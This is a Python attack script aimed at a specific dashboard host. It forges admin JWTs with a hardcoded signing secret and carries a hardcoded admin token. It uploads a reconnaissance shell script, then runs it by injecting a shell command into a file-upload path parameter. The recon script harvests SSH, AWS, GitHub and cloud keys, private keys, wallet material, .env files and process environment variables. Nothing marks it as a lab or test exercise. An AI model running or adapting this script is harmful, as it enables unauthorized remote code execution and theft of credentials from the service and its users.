#!/usr/bin/env python3
# i29311 phase2: validate auth + injection RCE on Brian's agent-047f1d22
import os, sys, json, base64, hmac, hashlib, subprocess, random
import urllib.parse as up
HOST = "dashboard.lumiiai.cn"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
JWT_SECRET = "w2I+OOqT9vkI12T3bNGwNp/2EA/L2H1ecwnWwA7UZ6A="
ADMIN_TOKEN = "6c73b13da5b9d09c642a3daa85be7d62d8025acfaebfdbe6"
def _b64(s): return base64.b64encode(s.encode("utf-8", "replace")).decode()
def R(k, v):
    s = v if isinstance(v, str) else json.dumps(v, ensure_ascii=False, default=str)
    print("R:%s:%s" % (k, _b64(s)), flush=True)
def sh(a, timeout=90):
    try:
        r = subprocess.run(a, capture_output=True, timeout=timeout); return r.returncode, r.stdout.decode("utf-8","replace"), r.stderr.decode("utf-8","replace")
    except Exception as e: return -1, "", repr(e)
def curl(args, timeout=40): return sh(["curl","-s","-k","-m",str(timeout)]+args, timeout=timeout+15)
def b64u(b):
    if isinstance(b,str): b=b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
def forge(p):
    h=b64u(json.dumps({"alg":"HS256","typ":"JWT"},separators=(",",":"))); pl=b64u(json.dumps(p,separators=(",",":")))
    return h+"."+pl+"."+b64u(hmac.new(JWT_SECRET.encode(),(h+"."+pl).encode(),hashlib.sha256).digest())
def tok_for(uid,cust): return forge({"userId":uid,"email":"probe@x","customer":cust,"role":"admin"})
def call(path,cookie=None,bearer=None,timeout=30,maxlen=200000):
    a=["--http2","-A",UA,"-H","Accept: application/json","-w","\n__CODE__%{http_code}"]
    if cookie: a+=["-H","Cookie: session="+cookie]
    if bearer: a+=["-H","Authorization: Bearer "+bearer]
    a+=["https://%s%s"%(HOST,path)]
    rc,out,err=curl(a,timeout=timeout); i=out.rfind("__CODE__"); code=""; txt=out
    if i>=0: code=out[i+8:].strip()[:3]; txt=out[:i]
    return {"code":code,"body":txt[:maxlen]}
def files_read(aid,path,tok,maxlen=50000): return call("/api/agents/%s/files?action=read&path=%s"%(aid,up.quote(path,safe="/")),cookie=tok,maxlen=maxlen)
def upload(aid,tok,path,name,content,timeout=60,auth="cookie"):
    tmp="/tmp/u_%d"%random.randint(1000,999999); open(tmp,"wb").write(content.encode() if isinstance(content,str) else content)
    url="https://%s/api/agents/%s/files/upload?path=%s"%(HOST,aid,up.quote(path,safe="/"))
    a=["--http2","-A",UA,"-w","\n__CODE__%{http_code}"]
    if auth=="cookie": a+=["-H","Cookie: session="+tok]
    else: a+=["-H","Authorization: Bearer "+tok]
    a+=["-F","files=@%s;filename=%s"%(tmp,name),url]
    rc,out,err=curl(a,timeout=timeout)
    i=out.rfind("__CODE__"); code=""; txt=out
    if i>=0: code=out[i+8:].strip()[:3]; txt=out[:i]
    return {"code":code,"body":txt[:800]}

AID="agent-047f1d22"; CUST="aro"; AUID="fc7c3730-4219-11f1-ac43-525400595be1"
RECON = r'''
set +e
echo "=== id ==="; id; echo "host=$(hostname)"; echo "pwd=$(pwd)"
echo "=== sudo ==="; sudo -n id 2>&1 | head -3
echo "=== home lumii ==="; ls -la /home/lumii 2>&1 | head -60
echo "=== mounts ==="; grep -E "lumii|/home" /proc/mounts 2>&1 | head -20
echo "=== ssh/aws/config dirs ==="; for d in .ssh .aws .config .gnupg .claude .gstack .codex-sessions .docker .lumii .local .kube Library; do echo "-- $d --"; ls -la /home/lumii/$d 2>&1 | head -15; done
echo "=== env files ==="; for f in .env .env.local .env.prod .env.dev .decart.env; do echo "## $f"; cat /home/lumii/$f 2>&1 | head -10; done
echo "=== grep secrets (home) ==="; grep -rIEa 'AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|LTAI[0-9A-Za-z]{12,}|JWT_SECRET|postgres://|mysql://|redis://|0x[0-9a-fA-F]{64}|BEGIN [A-Z ]*PRIVATE KEY|keystore|BIP39|zoofi|cloudflared|ghp_|gho_|github_pat_' /home/lumii/.ssh /home/lumii/.aws /home/lumii/.config /home/lumii/.claude /home/lumii/.gstack /home/lumii/.codex-sessions /home/lumii/.decart.env /home/lumii/attachments 2>/dev/null | cut -c1-300 | head -60
echo "=== proc1 env ==="; tr '\0' '\n' < /proc/1/environ 2>&1 | grep -iE 'token|secret|jwt|key|pass|database|ws' | head -20
echo "=== END ==="
'''
def main():
    TOK = tok_for(AUID, CUST)
    R("forge_me", call("/api/me", cookie=TOK))
    R("list_cookie", files_read(AID, "/home/lumii", TOK, maxlen=4000))
    R("list_bearer", call("/api/agents/%s/files?action=list&path=%s"%(AID,up.quote("/home/lumii",safe="/")), bearer=ADMIN_TOKEN, maxlen=2000))
    # upload recon script
    R("up_script", upload(AID, TOK, "/home/lumii/attachments", "recon_29311.sh", RECON, auth="cookie"))
    # trigger via ; injection
    R("trigger", upload(AID, TOK, "/home/lumii/attachments/zz; bash /home/lumii/attachments/recon_29311.sh > /home/lumii/attachments/out_29311.txt 2>&1; true", "dummy.txt", "x", auth="cookie"))
    R("read_out", files_read(AID, "/home/lumii/attachments/out_29311.txt", TOK, maxlen=60000))
try: main()
except Exception:
    import traceback; R("FATAL", traceback.format_exc()[-3000:])
finally: sys.exit(0)
